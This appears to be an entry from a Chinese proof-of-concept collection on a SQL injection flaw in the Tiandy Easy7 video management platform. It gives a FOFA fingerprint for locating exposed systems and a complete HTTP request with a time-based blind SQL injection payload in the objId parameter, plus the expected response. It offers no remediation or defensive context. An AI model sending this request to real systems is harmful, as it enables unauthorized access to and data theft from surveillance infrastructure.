# 天地伟业Easy7getAuthorityByUserId存在SQL注入漏洞

天地伟业 ｜ SQL注入 ｜ —
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`GET /Easy7/rest/user/getAuthorityByUserId?userId=&objId=a'and(select*from(select+sleep(5))a+union+select+1)='&authTypes.authTypes=1 HTTP/1.1`
- **响应特征**：200